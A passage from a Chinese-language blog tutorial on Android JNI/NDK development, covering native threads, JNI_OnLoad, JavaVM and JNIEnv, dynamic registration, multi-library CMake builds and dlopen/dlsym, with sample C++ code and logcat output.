phread 的指针，也是线程 id，第二个是线程属性，第三个是线程执行的函数，第四个是函数参数。</p><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;android/log.h&gt;#define TAG &quot;NshIdE&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);void* myThread(void* arg) &#123;    std::string test = &quot;this is a thread function&quot;;    LOGD(&quot;%s&quot;, test.c_str());    return nullptr;&#125;extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_javaandnative_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    std::string hello = &quot;Hello from C++&quot;;    pthread_t pthread;    pthread_create(&amp;pthread, nullptr, myThread, nullptr);    return env-&gt;NewStringUTF(hello.c_str());&#125;</code></pre><p>日志</p><pre><code class="language-shell">2025-08-14 17:14:44.334  3993-4264  NshIdE                  com.example.javaandnative            D  this is a thread function</code></pre><p>默认的线程属性是 <strong>joinable</strong> 随着主线程结束而结束的。</p><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;android/log.h&gt;#define TAG &quot;NshIdE&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);void* myThread(void* arg) &#123;    std::string test = &quot;this is a thread function&quot;;    LOGD(&quot;%s&quot;, test.c_str());    pthread_exit(nullptr);    return nullptr;&#125;extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_javaandnative_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    std::string hello = &quot;Hello from C++&quot;;    pthread_t pthread;    pthread_create(&amp;pthread, nullptr, myThread, nullptr);    pthread_join(pthread, nullptr);    return env-&gt;NewStringUTF(hello.c_str());&#125;</code></pre><p>上面代码中加了一个 <strong>pthread_join</strong>，这么做可以 确保线程执行完成、日志输出、资源回收，然后再返回到 Java 层。但这么做会导致<strong>主线程</strong>阻塞，可能会造成界面卡顿。如果使用 <strong>detach 分离线程</strong>，让它异步执行，就不会阻塞主线程。</p><h3 id="五、JNI-Onload"><a href="#五、JNI-Onload" class="headerlink" title="五、JNI_Onload"></a>五、JNI_Onload</h3><p>在使用 native 层方法之前都会先加载 native 层的so文件，通常在一个类的静态代码块中进行加载，当然也可以在构造函数，或者调用前加载。<strong>jvm</strong> 在加载 so 时都会先调用 so 中的 <strong>JNI_Onload</strong> 函数，如果你没有重写该方法，那么系统会给你自动生成一个。我们先来测试一下 JNI_Onload 的调用时机。</p><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;android/log.h&gt;#define TAG &quot;NshIdE&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);void* myThread(void* arg) &#123;    std::string test = &quot;this is a mythread now&quot;;    LOGD(&quot;%s&quot;, test.c_str());    pthread_exit(nullptr);    return nullptr;&#125;extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_javaandnative_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    LOGD(&quot;this is Java_com_example_javaandnative_MainActivity_stringFromJNI now&quot;);    std::string hello = &quot;Hello from C++&quot;;    pthread_t pthread;    pthread_create(&amp;pthread, nullptr, myThread, nullptr);    pthread_join(pthread, nullptr);    return env-&gt;NewStringUTF(hello.c_str());&#125;JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserver) &#123;    LOGI(&quot;this is JNI_OnLoad now&quot;);    JNIEnv *env = nullptr;    if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123;        LOGI(&quot;GetEnv failed&quot;);        return -1;    &#125;    return JNI_VERSION_1_6;&#125;</code></pre><p>日志</p><pre><code class="language-shell">2025-08-14 17:56:11.092 19068-19068 NshIdE                  com.example.javaandnative            I  this is JNI_OnLoad now2025-08-14 17:56:11.311 19068-19068 NshIdE                  com.example.javaandnative            D  this is Java_com_example_javaandnative_MainActivity_stringFromJNI now2025-08-14 17:56:11.312 19068-19094 NshIdE                  com.example.javaandnative            D  this is a mythread now</code></pre><p><strong>注意事项：</strong></p><ul><li><p>一个 so 中可以不人为的主动定义 JNI_OnLoad，但是一旦定义了 JNI_OnLoad，在 so 被加载的时候会立刻自动执行，并且必须返回一个 JNI 版本表示加载成功，JVM 会按这个版本返回 JNIEnv 和相关功能。目前一般都是返回 <strong>JNI_VERSION_1_6</strong>。1_2、1_4 版本太老，几乎没人用，最新版本的在目前很多 Android 机型上没适配。</p></li><li><p>在 so 被成功卸载时，会回调另一个 JNI 方法：JNI_UnOnLoad。这两个方法声明如下：</p><pre><code class="language-Java">JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved);JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved);</code></pre><p>其中第一个参数 vm 表示 DVM 虚拟机，该 vm 在应用进程中有且仅有一个，可以保存在 native 的静态变量中，供其他函数活线程使用。其返回值表示当前 native library 所需要的版本。</p></li></ul><h3 id="六、JavaVM"><a href="#六、JavaVM" class="headerlink" title="六、JavaVM"></a>六、JavaVM</h3><h4 id="6-1-JavaVM-是什么"><a href="#6-1-JavaVM-是什么" class="headerlink" title="6.1 JavaVM 是什么"></a>6.1 JavaVM 是什么</h4><p><strong>JavaVM</strong> 是虚拟机在 JNI 中的表示，一个 JVM 中只有一个 JavaVM 实例，这个实例是线程共享的，通过 <strong>JNIEnv</strong>* 可以获取一个 Java 虚拟机实例，其函数如下：</p><pre><code class="language-c++">jint GetJavaVM(JNIEnv *env, JavaVM **vm);</code></pre><p><strong>vm</strong> 用来存放获得的虚拟机指针的指针，成功时返回0，失败时返回其他值。</p><p>这里解释一下为什么可以通过 JNIEnv* 获取一个 Java 虚拟机实例。首先需要明白在 JNI 里，JNIEnv* 是 <strong>线程局部</strong> 的，每个线程都有一个自己的 JNIEnv*，不能跨线程使用，而 JavaVM 是全局唯一的 JVM 实例指针，可以在任意线程使用它去附加&#x2F;分离线程（<code>AttachCurrentThread</code> &#x2F; <code>DetachCurrentThread</code>）来获取新的 <code>JNIEnv</code>所以如果在 JNI_OnLoad 里没保存 JavaVM，后面又想在新的线程中使用 JNI，就需要从已有的 JNIEnv 反查它。</p><p>如果是 C++，则用 _JavaVM 定义，如果是 C，就用 JNIInvokeInterface 定义。详见如下：</p><pre><code class="language-c++">#if defined(__cplusplus)typedef _JNIEnv JNIEnv;typedef _JavaVM JavaVM;#elsetypedef const struct JNINativeInterface* JNIEnv;typedef const struct JNIInvokeInterface* JavaVM;#endif</code></pre><p>_JavaVM 和 JNIInvokeInterface 分别如下：</p><pre><code class="language-c++">/* * JNI invocation interface. */struct JNIInvokeInterface &#123;    void*       reserved0;    void*       reserved1;    void*       reserved2;    jint        (*DestroyJavaVM)(JavaVM*);    jint        (*AttachCurrentThread)(JavaVM*, JNIEnv**, void*);    jint        (*DetachCurrentThread)(JavaVM*);    jint        (*GetEnv)(JavaVM*, void**, jint);    jint        (*AttachCurrentThreadAsDaemon)(JavaVM*, JNIEnv**, void*);&#125;;/* * C++ version. */struct _JavaVM &#123;    const struct JNIInvokeInterface* functions;#if defined(__cplusplus)    jint DestroyJavaVM()    &#123; return functions-&gt;DestroyJavaVM(this); &#125;    jint AttachCurrentThread(JNIEnv** p_env, void* thr_args)    &#123; return functions-&gt;AttachCurrentThread(this, p_env, thr_args); &#125;    jint DetachCurrentThread()    &#123; return functions-&gt;DetachCurrentThread(this); &#125;    jint GetEnv(void** env, jint version)    &#123; return functions-&gt;GetEnv(this, env, version); &#125;    jint AttachCurrentThreadAsDaemon(JNIEnv** p_env, void* thr_args)    &#123; return functions-&gt;AttachCurrentThreadAsDaemon(this, p_env, thr_args); &#125;#endif /*__cplusplus*/&#125;;</code></pre><ul><li><p>这个底层逻辑很清晰了。_JavaVM 就是对 JNIInvokeInterface 的封装，底层逻辑还是调用 JNIInvokeInterface 的函数。这么带来的效果如下：</p><pre><code class="language-c++">// C++ 版本vm-&gt;AttachCurrentThread(&amp;env, NULL);</code></pre><pre><code class="language-c">//C 版本(*vm)-&gt;AttachCurrentThread(vm, &amp;env, NULL);</code></pre></li><li><p>JavaVM 中的常用方法：<strong>GetEnv</strong> 和 <strong>AttachCurrentThread</strong>(在子线程中获取JNIEnv)</p></li></ul><hr><h4 id="6-2-JavaVM-的获取方式"><a href="#6-2-JavaVM-的获取方式" class="headerlink" title="6.2 JavaVM 的获取方式"></a>6.2 JavaVM 的获取方式</h4><ul><li>JNI_OnLoad 的第一个参数</li><li>JNI_UnOnLoad 的第一个参数</li><li>env-&gt;GetJavaVM</li></ul><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;android/log.h&gt;#define TAG &quot;NshIdE&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);void* myThread(void* arg) &#123;    std::string test = &quot;this is a mythread now&quot;;    LOGD(&quot;%s&quot;, test.c_str());    pthread_exit(nullptr);    return nullptr;&#125;extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_javaandnative_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    LOGD(&quot;this is Java_com_example_javaandnative_MainActivity_stringFromJNI now&quot;);    std::string hello = &quot;Hello from C++&quot;;    pthread_t pthread;    pthread_create(&amp;pthread, nullptr, myThread, nullptr);    pthread_join(pthread, nullptr);    return env-&gt;NewStringUTF(hello.c_str());&#125;JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserver) &#123;    JNIEnv *env = nullptr;    if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123;        LOGI(&quot;GetEnv failed&quot;);        return -1;    &#125;    LOGD(&quot;JavaVM %p&quot;, vm);    JavaVM* vm1 = nullptr;    env-&gt;GetJavaVM(&amp;vm1);    LOGD(&quot;env-&gt;GetJavaVM %p&quot;, vm1);    return JNI_VERSION_1_6;&#125;</code></pre><p>查看日志</p><pre><code class="language-shell">2025-08-15 10:35:54.068 27209-27209 NshIdE                  com.example.javaandnative            D  JavaVM 0xb400006fd5b8f5402025-08-15 10:35:54.068 27209-27209 NshIdE                  com.example.javaandnative            D  env-&gt;GetJavaVM 0xb400006fd5b8f5402025-08-15 10:35:54.219 27209-27209 NshIdE                  com.example.javaandnative            D  this is Java_com_example_javaandnative_MainActivity_stringFromJNI now2025-08-15 10:35:54.219 27209-27384 NshIdE                  com.example.javaandnative            D  this is a mythread now</code></pre><h3 id="七、JNIEnv"><a href="#七、JNIEnv" class="headerlink" title="七、JNIEnv"></a>七、JNIEnv</h3><h4 id="7-1-JNIEnv-是什么"><a href="#7-1-JNIEnv-是什么" class="headerlink" title="7.1 JNIEnv 是什么"></a>7.1 JNIEnv 是什么</h4><p><strong>JNIEnv</strong> 一般是由虚拟机传入的，而且是与线程相关的变量，即<strong>线程 A</strong> 不能使用<strong>线程 B</strong> 的 JNIEnv。而作为一个结构体，它里面定义了 JNI 系统的操作函数。JNI 定义如下</p><pre><code class="language-c++">#if defined(__cplusplus)typedef _JNIEnv JNIEnv;#elsetypedef const struct JNINativeInterface* JNIEnv;#endif</code></pre><p>JNIEnv 在 <strong>C 语言</strong>环境和 <strong>C++ 语言</strong>环境中的实现是不一样的。在 C 中定义为 JNINativeInterface，在 C++ 中定义为 _JNIEnv。</p><p>_JNIEnv 结构体的定义如下</p><pre><code class="language-c++">struct _JNIEnv &#123;/* do not rename this; it does not seem to be entirely opaque */const struct JNINativeInterface* functions;#if defined(__cplusplus)jint GetVersion()&#123; return functions-&gt;GetVersion(this); &#125;jclass DefineClass(const char *name, jobject loader, const jbyte* buf,jsize bufLen)&#123; return functions-&gt;DefineClass(this, name, loader, buf, bufLen); &#125;jclass FindClass(const char* name)&#123; return functions-&gt;FindClass(this, name); &#125;......#endif&#125;</code></pre><p>在  _JNIEnv 中定义了一个 functions 变量，这个变量是指向 JNINativeInterface 的指针。所以如果我们在写 native 函数时，当接收到类型为 JNIEnv* 的变量 env 时，可以使用如下方式调用 JNIEnv 中的函数（准确说时通过函数指针来调用函数，因为 JNIEnv 的数据结果聚合了所有 JNI 函数的函数指针），我们可以在 C++ 中通过如下方式调用：</p><pre><code class="language-c++">env-&gt;FindClass(&quot;java/lang/String&quot;)</code></pre><p>而在 C 中可以通过如下方式调用：</p><pre><code class="language-c">(*env)-&gt;FindClass(env, &quot;java/lang/String&quot;)</code></pre><p>由于变量 functions 是定义在结构体 _JNIEnv 的第一个变量，所以我们通过 *env 就能获取到 functions 变量的值，然后通过 JNINativeInterface 中的函数指针来调用对应的函数。</p><p>JNINativeInterface 结构体的定义如下：</p><pre><code class="language-c++">struct JNINativeInterface &#123;void* reserved0;void* reserved1;void* reserved2;void* reserved3;jint (*GetVersion)(JNIEnv *);jclass (*DefineClass)(JNIEnv*, const char*, jobject, const jbyte*,jsize);jclass (*FindClass)(JNIEnv*, const char*);...&#125;</code></pre><hr><h4 id="8-2-JNIEnv-的获取方式"><a href="#8-2-JNIEnv-的获取方式" class="headerlink" title="8.2 JNIEnv 的获取方式"></a>8.2 JNIEnv 的获取方式</h4><ol><li><p>函数静态 &#x2F; 动态注册，传的第一个参数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250815105735120.png" alt="image-20250815105735120"></p></li><li><p>vm-&gt;GetEnv<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250815105803354.png" alt="image-20250815105803354"></p></li><li><p>globalVM-&gt;AttachCurrentThread<br>用于子线程中获取 JNIEnv*</p><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;android/log.h&gt;#define TAG &quot;NshIdE&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);JavaVM* global_vm;void* myThread(void* arg) &#123;    JNIEnv* env = nullptr;    if (global_vm-&gt;AttachCurrentThread(&amp;env, nullptr) != JNI_OK) &#123;        LOGE(&quot;AttachCurrentThread failed&quot;);        return nullptr;    &#125;    LOGD(&quot;myThread env: %p&quot;, env);    std::string test = &quot;this is a mythread now&quot;;    LOGD(&quot;%s&quot;, test.c_str());    // 用完一定要分离线程    global_vm-&gt;DetachCurrentThread();    pthread_exit(nullptr);    return nullptr;&#125;extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_javaandnative_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    LOGD(&quot;this is Java_com_example_javaandnative_MainActivity_stringFromJNI now&quot;);    LOGD(&quot;Java_com_example_javaandnative_MainActivity_stringFromJNI env: %p&quot;, env);    std::string hello = &quot;Hello from C++&quot;;    pthread_t pthread;    pthread_create(&amp;pthread, nullptr, myThread, nullptr);    pthread_join(pthread, nullptr);    return env-&gt;NewStringUTF(hello.c_str());&#125;JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserver) &#123;    global_vm = vm;    JNIEnv *env = nullptr;    if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123;        LOGI(&quot;GetEnv failed&quot;);        return -1;    &#125;    LOGD(&quot;JavaVM %p&quot;, env);    return JNI_VERSION_1_6;&#125;</code></pre><p>查看日志</p><pre><code class="language-shell">2025-08-15 11:09:08.977 30300-30300 NshIdE                  com.example.javaandnative            D  JavaVM 0xb400006fd5bff3c02025-08-15 11:09:09.455 30300-30300 NshIdE                  com.example.javaandnative            D  this is Java_com_example_javaandnative_MainActivity_stringFromJNI now2025-08-15 11:09:09.455 30300-30300 NshIdE                  com.example.javaandnative            D  Java_com_example_javaandnative_MainActivity_stringFromJNI env: 0xb400006fd5bff3c02025-08-15 11:09:09.455 30300-30347 NshIdE                  com.example.javaandnative            D  myThread env: 0xb400006f207625802025-08-15 11:09:09.455 30300-30347 NshIdE                  com.example.javaandnative            D  this is a mythread now</code></pre><p>JNIEnv 是每个线程单独拥有的一个，对于 JNI_OnLoad 和 Java_com_example_javaandnative_MainActivity_stringFromJNI 都在主线程中，所以他们的值是相等的，而 myThread 是一个新开的线程，所以打印出来的 JNIEnv 值不一样。</p></li></ol><h3 id="八、JNI-函数的注册"><a href="#八、JNI-函数的注册" class="headerlink" title="八、JNI 函数的注册"></a>八、JNI 函数的注册</h3><h4 id="8-1-静态注册"><a href="#8-1-静态注册" class="headerlink" title="8.1 静态注册"></a>8.1 静态注册</h4><p>必须遵循一定的命名规则，一般都是 Java_ 包名_ 类名_ 方法名。</p><p>系统会通过 <strong>dlopen</strong> 加载对应的 so，通过 <strong>dlsym</strong> 来获取指定名字的函数地址，然后调用静态注册的 jni 函数，必然在 <strong>导出表</strong> 中。</p><hr><h4 id="8-2-动态注册"><a href="#8-2-动态注册" class="headerlink" title="8.2 动态注册"></a>8.2 动态注册</h4><p>通过 <strong>env-&gt;RegisterNatives</strong> 注册函数，通常在 JNI_OnLoad 中注册</p><pre><code class="language-c++">typedef struct &#123;    const char* name;    const char* signature;    void*       fnPtr;&#125; JNINativeMethod;</code></pre><p><strong>JNINativeMethod</strong> 是一个结构体，第一个成员是 Java 层的函数名；第二个是签名，通常格式为(参数类型)返回值类型【其实就是在 smali 代码中看到的那种格式的函数签名】；第三个参数是 Native 层的函数指针（可以直接根据这个指针找到动态注册的函数的函数体）。</p><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;android/log.h&gt;#define TAG &quot;NshIdE&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);JavaVM* global_vm;extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_javaandnative_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    LOGD(&quot;this is Java_com_example_javaandnative_MainActivity_stringFromJNI now&quot;);    LOGD(&quot;Java_com_example_javaandnative_MainActivity_stringFromJNI env: %p&quot;, env);    std::string hello = &quot;Hello from C++&quot;;    return env-&gt;NewStringUTF(hello.c_str());&#125;jstring FunctionTest(JNIEnv* env, jobject thiz, int a, jstring b, jbyteArray c) &#123;    return env-&gt;NewStringUTF(&quot;This is FunctionTest&quot;);&#125;JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserver) &#123;    global_vm = vm;    JNIEnv *env = nullptr;    if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123;        LOGI(&quot;GetEnv failed&quot;);        return -1;    &#125;    jclass MainActivityClazz = env-&gt;FindClass(&quot;com/example/javaandnative/MainActivity&quot;);    JNINativeMethod methods[] = &#123;            &#123;&quot;stringFromJNI1&quot;, &quot;(ILjava/lang/String;[B)Ljava/lang/String;&quot;, (void *)FunctionTest&#125;    &#125;;    env-&gt;RegisterNatives(MainActivityClazz, methods, sizeof(methods) / sizeof(JNINativeMethod));    return JNI_VERSION_1_6;&#125;</code></pre><p>然后在 Java 层记得调用注册的这个方法即可，运行就可以看到<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250815114205531.png" alt="image-20250815114205531"></p><p>可以给同一个 Java 函数注册多个 native 函数，以最后一次为准</p><h3 id="九、多个-cpp-文件编译成一个-so"><a href="#九、多个-cpp-文件编译成一个-so" class="headerlink" title="九、多个 cpp 文件编译成一个 so"></a>九、多个 cpp 文件编译成一个 so</h3><p>新建一个 cpp 文件</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250815144948630.png" alt="image-20250815144948630"></p><p>然后修改 CMakeLists.txt 文件<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250815145019477.png" alt="image-20250815145019477"></p><p>然后在 JNI_OnLoad 中调用这个函数</p><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;android/log.h&gt;#define TAG &quot;NshIdE&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);JavaVM* global_vm;// 声明另一个文件里的函数extern &quot;C&quot; void TestMain(JNIEnv* env);extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_javaandnative_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    std::string hello = &quot;Hello from C++&quot;;    return env-&gt;NewStringUTF(hello.c_str());&#125;jstring FunctionTest(JNIEnv* env, jobject thiz, int a, jstring b, jbyteArray c) &#123;    return env-&gt;NewStringUTF(&quot;This is FunctionTest&quot;);&#125;JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserver) &#123;    global_vm = vm;    JNIEnv *env = nullptr;    if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123;        LOGI(&quot;GetEnv failed&quot;);        return -1;    &#125;    jclass MainActivityClazz = env-&gt;FindClass(&quot;com/example/javaandnative/MainActivity&quot;);    JNINativeMethod methods[] = &#123;            &#123;&quot;stringFromJNI&quot;, &quot;(ILjava/lang/String;[B)Ljava/lang/String;&quot;, (void *)FunctionTest&#125;    &#125;;    env-&gt;RegisterNatives(MainActivityClazz, methods, sizeof(methods) / sizeof(JNINativeMethod));    // 直接调用    TestMain(env);    return JNI_VERSION_1_6;&#125;</code></pre><p>查看日志，就可以看到我们成功调用了另一个 so 里的函数</p><pre><code class="language-shell">2025-08-15 14:58:03.377   843-843   NshIdE                  com.example.javaandnative            D  This is TestMain for many cpp</code></pre><h3 id="十、编译多个-so"><a href="#十、编译多个-so" class="headerlink" title="十、编译多个 so"></a>十、编译多个 so</h3><ol><li>编写多个 cpp 文件</li><li>修改 CMakeLists.txt</li><li>Java 静态代码块加载多个 so</li></ol><p>首先先修改 CMakeLists.txt 文件</p><pre><code class="language-ASN.1"># For more information about using CMake with Android Studio, read the# documentation: https://d.android.com/studio/projects/add-native-code.html.# For more examples on how to use CMake, see https://github.com/android/ndk-samples.# 说明：这几行是官方提供的参考链接，方便你学习 CMake 和 NDK 的使用。# Sets the minimum CMake version required for this project.cmake_minimum_required(VERSION 3.22.1)# 设置本项目要求的 CMake 最低版本，这里是 3.22.1。# 如果你的系统 CMake 版本低于这个，会直接报错。# Declares the project name. The project name can be accessed via $&#123; PROJECT_NAME&#125;,# Since this is the top level CMakeLists.txt, the project name is also accessible# with $&#123;CMAKE_PROJECT_NAME&#125; (both CMake variables are in-sync within the top level# build script scope).project(&quot;javaandnative&quot;)# 定义项目名称为 &quot;javaandnative&quot;。# 在这个顶层 CMakeLists.txt 中，$&#123;PROJECT_NAME&#125; 和 $&#123;CMAKE_PROJECT_NAME&#125; 都可以访问这个名字。# Creates and names a library, sets it as either STATIC# or SHARED, and provides the relative paths to its source code.# You can define multiple libraries, and CMake builds them for you.# Gradle automatically packages shared libraries with your APK.## In this top level CMakeLists.txt, $&#123;CMAKE_PROJECT_NAME&#125; is used to define# the target library name; in the sub-module&#39;s CMakeLists.txt, $&#123;PROJECT_NAME&#125;# is preferred for the same purpose.## In order to load a library into your app from Java/Kotlin, you must call# System.loadLibrary() and pass the name of the library defined here;# for GameActivity/NativeActivity derived applications, the same library name must be# used in the AndroidManifest.xml file.add_library($&#123;CMAKE_PROJECT_NAME&#125; SHARED        # List C/C++ source files with relative paths to this CMakeLists.txt.        native-lib.cpp)# 创建一个库（library）。# $&#123;CMAKE_PROJECT_NAME&#125; → 这里会替换成 &quot;javaandnative&quot;，也就是库的名字。# SHARED 表示生成的是动态库（.so 文件），不是静态库（.a）。# 后面是库包含的源文件列表，这里只有 native-lib.cpp。# 注意：如果要在 Java/Kotlin 中加载这个库，需要调用 System.loadLibrary(&quot;javaandnative&quot;)。# Specifies libraries CMake should link to your target library. You# can link libraries from various origins, such as libraries defined in this# build script, prebuilt third-party libraries, or Android system libraries.target_link_libraries($&#123;CMAKE_PROJECT_NAME&#125;        # List libraries link to the target library        android        log)# 指定要和你的库一起链接的其他库。# $&#123;CMAKE_PROJECT_NAME&#125; 是你的库名字（javaandnative）。# 这里链接了两个 Android NDK 自带的库：#   android → 提供 Android NDK 相关 API（如 NativeActivity）。#   log → 提供 __android_log_print 等日志函数，用于在 logcat 输出调试信息。# 新增的库add_library(nshide SHARED        NshIdE.cpp)target_link_libraries(nshide        android        log)</code></pre><p>接下来修改 Java 代码。这里需要注意加载顺序，如果库之间有依赖关系，需要<strong>先加载被依赖的库</strong>。</p><pre><code class="language-Java">    static &#123;        System.loadLibrary(&quot;javaandnative&quot;);        System.loadLibrary(&quot;nshide&quot;);    &#125;</code></pre><p>并且还需要再 CMake 中显式链接，例如</p><pre><code class="language-ASN.1">target_link_libraries(javaandnative        mylib        android        log)</code></pre><p>最后新建一个 cpp 文件，也不需要写什么，空着就可以，然后 build 一下，就可以看到生成了两个 so<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250815144459070.png" alt="image-20250815144459070"></p><h3 id="十一、so-文件路径的动态获取"><a href="#十一、so-文件路径的动态获取" class="headerlink" title="十一、so 文件路径的动态获取"></a>十一、so 文件路径的动态获取</h3><p>首先需要知道 apk 中的 so 文件将来要放在设备环境的哪一个目录下，&#x2F;data&#x2F;app&#x2F;包名&#x2F;lib。</p><p>然后在 Java 层添加如下代码</p><pre><code class="language-Java">public String getSoPath(Context cxt) &#123;        // 获取包管理        PackageManager pm = cxt.getPackageManager();        // 获取已安装的 APP 的信息        List&lt;PackageInfo&gt; pkgList = pm.getInstalledPackages(0);        if (pkgList == null || pkgList.size() == 0) &#123;            return null;        &#125;        for (PackageInfo pi : pkgList) &#123;            // 判断是否为 /data/app 开头            if (pi.applicationInfo.nativeLibraryDir.startsWith(&quot;/data/app/&quot;)                    &amp;&amp; pi.packageName.startsWith(&quot;com.example.javaandnative&quot;)) &#123;                return pi.applicationInfo.nativeLibraryDir;            &#125;        &#125;        return null;    &#125;</code></pre><p>然后在 onCreate() 函数中调用一下即可。查看日志</p><pre><code class="language-shell">2025-08-15 15:07:41.119  3830-3830  soPath                  com.example.javaandnative            D  /data/app/~~WmEKdieXJYNMsr4K93mc6A==/com.example.javaandnative-mXf7pi0TKTKavIqppE7IOw==/lib/arm64</code></pre><h3 id="十二、so-之间相互调用"><a href="#十二、so-之间相互调用" class="headerlink" title="十二、so 之间相互调用"></a>十二、so 之间相互调用</h3><p>这里就需要用到 <strong>dlopen</strong> 函数，需要导入 <strong>dlfcn.h</strong>。如果去看这个库的源码，会发现在后半段有一些常量，这些是传给 dlopen() 的标志位，控制加载策略</p><table><thead><tr><th>常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td><code>RTLD_LOCAL</code></td><td>0</td><td>默认值：该库的符号不会导出给之后加载的库用。</td></tr><tr><td><code>RTLD_LAZY</code></td><td>0x00001</td><td><strong>延迟解析符号</strong>（Android 不支持，实际等同 RTLD_NOW）。</td></tr><tr><td><code>RTLD_NOW</code></td><td>0x00002（LP64） &#x2F; 0x00000（LP32）</td><td><strong>立即解析符号</strong>（Android 始终是这个行为）。</td></tr><tr><td><code>RTLD_NOLOAD</code></td><td>0x00004</td><td>只检查库是否已加载，不真正加载（用于探测）。</td></tr><tr><td><code>RTLD_GLOBAL</code></td><td>0x00100（LP64） &#x2F; 0x00002（LP32）</td><td>导出该库的符号，后续加载的库可以用。</td></tr><tr><td><code>RTLD_NODELETE</code></td><td>0x01000</td><td>即使 <code>dlclose()</code> 也不卸载库。</td></tr></tbody></table><p>在使用 dlopen() 函数时，需要传入两个参数，第一个就是 so 的路径，第二个就是刚刚提到的 常量，常用的就是 <strong>RTLD_NOW</strong>。在 JNI_OnLoad 中调用。</p><pre><code class="language-c++">void* handle = dlopen(&quot;libnshide.so&quot;, RTLD_NOW);    if (!handle) &#123;        LOGE(&quot;dlopen failed: %s&quot;, dlerror());    &#125; else &#123;        typedef void (*TestMainFunc)(JNIEnv*);        TestMainFunc func = (TestMainFunc)dlsym(handle, &quot;TestMain&quot;);        if (func) &#123;            func(env);        &#125; else &#123;            LOGE(&quot;dlsym failed: %s&quot;, dlerror());        &#125;        dlclose(handle);    &#125;</code></pre><ul><li><code>dlopen</code> 是 Linux&#x2F;Android 提供的 <strong>运行时加载共享库</strong> 的函数；</li><li>它会把指定的 <code>.so</code> 加载到当前进程中，返回一个 <strong>库的句柄</strong>；</li><li>如果加载失败，会返回 <code>nullptr</code>，这时候可以用 <code>dlerror()</code> 查看错误原因。</li></ul><p>注：<code>dlopen</code> <strong>只加载库</strong>，并不会自动让你能直接调用库里的函数。</p><ul><li><code>dlsym</code> 是在 <strong>运行时</strong> 